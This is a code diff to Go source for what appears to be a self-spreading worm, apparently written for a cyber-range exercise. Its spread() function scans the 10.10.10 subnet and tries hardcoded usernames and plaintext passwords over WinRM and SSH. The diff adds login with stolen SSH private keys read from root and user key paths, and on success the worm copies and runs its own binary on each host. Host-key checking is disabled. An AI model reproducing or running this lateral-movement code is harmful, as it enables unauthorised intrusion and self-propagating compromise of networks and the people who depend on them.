@@ -89,21 +89,34 @@ func run_WinRM_cmds(winrm_client *winrm.Client, cmd string) error {
 	return err
 }
 
-func establish_SSH(host_ip, username, pswd string) (*ssh.Client, error){
-	config := &ssh.ClientConfig{
-		User: username,
-		Auth: []ssh.AuthMethod{
-			ssh.Password(pswd),
-		},
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-	}
+func establish_SSH(host_ip, username, pswd string, keyPath string) (*ssh.Client, error) {
+    authMethods := []ssh.AuthMethod{
+        ssh.Password(pswd),
+    }
 
-	client, err := ssh.Dial("tcp", host_ip + ":22", config)
-	if err != nil {
-		return nil, err
-	}
+    // try key if provided
+    if keyPath != "" {
+        key, err := os.ReadFile(keyPath)
+        if err == nil {
+            signer, err := ssh.ParsePrivateKey(key)
+            if err == nil {
+                authMethods = append([]ssh.AuthMethod{ssh.PublicKeys(signer)}, authMethods...)
+            }
+        }
+    }
 
-	return client, nil
+    config := &ssh.ClientConfig{
+        User:            username,
+        Auth:            authMethods,
+        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+        Timeout:         10 * time.Second,
+    }
+
+    client, err := ssh.Dial("tcp", host_ip+":22", config)
+    if err != nil {
+        return nil, err
+    }
+    return client, nil
 }
 
 func run_SSH_cmds(ssh_client *ssh.Client, cmd string) error {
@@ -138,11 +151,13 @@ func spread() {
         exclusion_map[ip] = true
     }
 
-    creds := []struct{ user, pass string }{
-        {"sjohnson",      "UwU?OwO!67"},
-        {"Administrator", "UwU?OwO!67"},
-        {"cyberrange",    "Cyberrange123!"},
-        {"root",          "Cyberrange123!"},
+    creds := []struct {
+        user, pass, key string
+    }{
+        {"sjohnson",      "UwU?OwO!67",     ""},
+        {"Administrator", "UwU?OwO!67",     ""},
+        {"cyberrange",    "Cyberrange123!", "/home/cyberrange/.ssh/id_rsa"},
+        {"root",          "Cyberrange123!", "/root/.ssh/id_rsa"},
     }
 
     target_hosts := discover_hosts("10.10.10")
@@ -165,43 +180,51 @@ func spread() {
             defer wg.Done()
             done := make(chan string, 2)
 
-            
-			go func() {
-				for _, c := range creds {
-					log.Printf("[*] WinRM | %s | trying %s", ip, c.user)
-					client, err := establish_winRM(ip, c.user, c.pass)
-					if err != nil {
-						log.Printf("[-] WinRM | %s | auth failed for %s: %v", ip, c.user, err)
-						continue
-					}
-					log.Printf("[+] WinRM | %s | auth succeeded with %s", ip, c.user)
-					if err := drop_and_run_winrm(client, selfData, ip); err != nil {
-						continue
-					}
-					done <- "winrm"
-					return
-				}
-				log.Printf("[-] WinRM | %s | all creds exhausted", ip)
-			}()
+            // try WinRM with all creds
+            go func() {
+                for _, c := range creds {
+                    log.Printf("[*] WinRM | %s | trying %s", ip, c.user)
+                    client, err := establish_winRM(ip, c.user, c.pass)
+                    if err != nil {
+                        log.Printf("[-] WinRM | %s | auth failed for %s: %v", ip, c.user, err)
+                        continue
+                    }
+                    // verify WinRM actually works by running a test command
+                    if err := run_WinRM_cmds(client, "whoami"); err != nil {
+                        log.Printf("[-] WinRM | %s | connection verify failed for %s: %v", ip, c.user, err)
+                        continue
+                    }
+                    log.Printf("[+] WinRM | %s | auth succeeded with %s", ip, c.user)
+                    if err := drop_and_run_winrm(client, selfData, ip); err != nil {
+                        log.Printf("[-] WinRM | %s | drop failed: %v", ip, err)
+                        continue
+                    }
+                    done <- "winrm"
+                    return
+                }
+                log.Printf("[-] WinRM | %s | all creds exhausted", ip)
+            }()
 
-			go func() {
-				for _, c := range creds {
-					log.Printf("[*] SSH | %s | trying %s", ip, c.user)
-					client, err := establish_SSH(ip, c.user, c.pass)
-					if err != nil {
-						log.Printf("[-] SSH | %s | auth failed for %s: %v", ip, c.user, err)
-						continue
-					}
-					log.Printf("[+] SSH | %s | auth succeeded with %s", ip, c.user)
-					defer client.Close()
-					if err := drop_and_run_ssh(client, selfData, ip); err != nil {
-						continue
-					}
-					done <- "ssh"
-					return
-				}
-				log.Printf("[-] SSH | %s | all creds exhausted", ip)
-			}()
+            // try SSH with all creds
+            go func() {
+                for _, c := range creds {
+                    log.Printf("[*] SSH | %s | trying %s", ip, c.user)
+                    client, err := establish_SSH(ip, c.user, c.pass, c.key)
+                    if err != nil {
+                        log.Printf("[-] SSH | %s | auth failed for %s: %v", ip, c.user, err)
+                        continue
+                    }
+                    log.Printf("[+] SSH | %s | auth succeeded with %s", ip, c.user)
+                    defer client.Close()
+                    if err := drop_and_run_ssh(client, selfData, ip); err != nil {
+                        log.Printf("[-] SSH | %s | drop failed: %v", ip, err)
+                        continue
+                    }
+                    done <- "ssh"
+                    return
+                }
+                log.Printf("[-] SSH | %s | all creds exhausted", ip)
+            }()
 
             select {
             case method := <-done:
